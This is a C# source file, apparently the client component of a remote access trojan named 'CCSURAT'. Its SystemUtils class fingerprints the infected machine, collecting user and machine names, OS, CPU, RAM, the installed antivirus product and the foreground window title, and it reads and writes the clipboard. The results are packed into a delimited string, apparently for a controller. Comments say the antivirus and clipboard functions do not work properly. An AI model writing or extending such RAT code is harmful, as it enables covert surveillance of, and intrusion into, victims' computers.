using System;
using Microsoft.Win32;
using System.Management;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace CCSURAT_Client
{
    // this class is used to retrieve/store information on the client PC
    // this will also be where info/basic command functions are written.
    static class SystemUtils
    {
        public static string SystemInfo()
        { 
            string info = "";
            info += Application.ProductVersion + "|*|";
            info += Environment.MachineName + "|*|";
            info += Environment.UserName + "|*|";
            info += GetOS() + "|*|";
            info += GetCPU() + "|*|";
            info += GetRAM() + "|*|";
            info += GetAV() + "|*|";
            info += GetActiveWindow();
            return info;
        }

        // Get OS version from registry, other way would be translating it from Environment class
        public static string GetOS()
        {
            RegistryKey reg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            return (string)reg.GetValue("ProductName");
        }

        public static string GetCPU()
        {
            // Can count subkeys to get # of cores.
            RegistryKey reg = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
            return (string)reg.GetValue("ProcessorNameString");
        }

        public static string GetRAM()
        {
            long total = 0;
            // Query WMI
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");
            // Get each stick of installed memory
            foreach (ManagementObject mObj in searcher.Get())
            {
                // Convert to GB from Bytes and add to total
                 total += Convert.ToInt64(mObj["Capacity"]) / 1024 / 1024 / 1024;
            }
            return total.ToString() + " GB";
        }

        // Attempts to grab AV from WMI, test have shown that this may not work properly. Rework.
        public static string GetAV()
        {
            try
            {
                ManagementObjectSearcher searcher = null;
                searcher = new ManagementObjectSearcher(@"\" + Environment.MachineName + @"rootSecurityCenter2","SELECT * FROM AntivirusProduct");
                foreach (ManagementObject mObj in searcher.Get())
                    return mObj["displayName"].ToString();
            }
            catch(Exception ex)
            {
                return "Not Found";
            }
            return "Not Found";
        }

        // Get current active (window in foreground window
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        public static string GetActiveWindow()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        // ########## Desperate attempt to get clipboard, DOES NOT WORK, need to figure out why.
        // #####################################################################################
        public static string GetClipboard()
        {
            IDataObject iData = Clipboard.GetDataObject();
            return Clipboard.GetData(DataFormats.Text).ToString();
        }
        public static void SetClipboard(string s)
        {
            Clipboard.SetText(s);
        }
    }
}
